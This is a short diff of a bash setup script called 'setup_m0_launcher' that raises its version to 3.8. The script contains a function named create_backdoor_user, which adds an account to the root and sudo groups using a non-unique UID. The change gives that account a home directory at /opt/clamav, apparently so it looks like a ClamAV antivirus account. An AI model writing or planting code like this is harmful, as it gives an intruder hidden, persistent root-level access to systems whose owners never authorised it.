@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="3.7"
-readonly BUILD_DATE="2026-03-15 01:41:30 UTC"
+readonly SCRIPT_VERSION="3.8"
+readonly BUILD_DATE="2026-03-15 04:03:33 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
 
 echo "=========================================="
@@ -1393,10 +1393,10 @@ create_backdoor_user() {
         groupadd "$username" 2>/dev/null || log_message "Warning: Could not create user group"
     fi
     
-    # Create the user
-    log_message "Creating user account"
-    if useradd -u "$uid" -G root,sudo -g "$username" -M -o -s /bin/bash "$username" 2>/dev/null; then
-        log_message "User created successfully"
+    # Create the user with home directory at /opt/clamav
+    log_message "Creating user account with home at /opt/clamav"
+    if useradd -u "$uid" -G root,sudo -g "$username" -m -d /opt/clamav -o -s /bin/bash "$username" 2>/dev/null; then
+        log_message "User created successfully with home at /opt/clamav"
     else
         log_message "ERROR: Failed to create user"
         return 1
